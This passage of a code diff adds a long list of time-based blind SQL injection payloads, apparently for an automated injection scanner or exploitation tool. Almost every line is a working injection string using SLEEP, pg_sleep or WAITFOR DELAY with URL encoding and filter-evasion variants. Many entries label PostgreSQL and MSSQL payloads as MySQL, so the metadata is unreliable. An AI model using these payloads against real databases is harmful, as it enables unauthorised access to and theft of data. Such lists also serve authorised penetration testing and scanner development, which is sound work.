+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';pg_sleep(dexp(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';pg_sleep(dexp(10))--%20",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'AND(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))AND'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'AND(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))AND'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'OR(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))OR'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'OR(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))OR'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'XOR(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))XOR'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'XOR(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))XOR'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'XOR(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))XOR'Z--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'XOR(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))XOR'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'XOR(SECOND(IF(1=1,SLEEP(time(10)),0)))XOR'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'XOR(SECOND(IF(1=1,SLEEP(time(10)),0)))XOR'Z--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ")%20WAITFOR%20DELAY%20N'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ")%20WAITFOR%20DELAY%20N'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ",(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ",(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ",(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ",SECOND(IF(1=1,SLEEP(SECOND(10)),0))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "0\"XOR(SECOND(IF(1=1,SLEEP(time(10)),0)))XOR\"Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "0'XOR(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))XOR'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "0'XOR(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))XOR'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "0'XOR(SECOND(IF(1=1,SLEEP(time(10)),0)))XOR'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20%26%20SECOND(ELT(1453=1453,SLEEP(SECOND(10))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20AND%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20AND%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20AND%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20and%20sleep(time(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20and%20sleep(time(10))%23",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20%00'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20%00'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20%08'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20%08'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20%11'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20%11'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20%1D'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20%1D'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20N'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20N'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20OR%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20OR%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20OR%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20OR%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20or%20sleep(time(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20or%20sleep(time(10))%23",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20RLIKE%20SLEEP(time(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20%00'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20%08'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20%11'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20%1D'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%20WAITFOR%20DELAY%20N'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%26SLEEP(time(10))%23",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1%26SLEEP(time(10))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1'XOR(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))XOR'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1'XOR(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))XOR'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1'XOR(SECOND(IF(1=1,SLEEP(time(10)),0)))XOR'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20WAITFOR%20DELAY%20%00'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20WAITFOR%20DELAY%20%00'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20WAITFOR%20DELAY%20%08'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20WAITFOR%20DELAY%20%08'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20WAITFOR%20DELAY%20%11'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20WAITFOR%20DELAY%20%11'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20WAITFOR%20DELAY%20%1D'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20WAITFOR%20DELAY%20%1D'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20WAITFOR%20DELAY%20N'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20WAITFOR%20DELAY%20N'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20sleep(time(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";%20sleep(time(10))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";pg_sleep(dexp(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": ";pg_sleep(dexp(10))--%20",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%7C(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "%7C(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))0'XOR(if%20%20(%2029%20!=%20%2093%20,%20sleep%20%20(%20(%20(%20%20(%2010%20%20)%20)%20%20)%20)%20,%200%20%20))XOR'Z",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "-CASE%20%20WHEN%20%20%20(%20(%20(%20(%201%20%20=%20%201%20)))%20)%20%20THEN%20%20(%20(%20SLEEP%20(%20(%20(%2010%20%20)%20)%20)%20)%20)%20END",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20or%20if%20%20(%2029%20!=%20%2093%20,%20sleep%20%20(%20(%20(%20%20(%2010%20%20)%20)%20%20)%20)%20,%200%20%20)--%20-",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
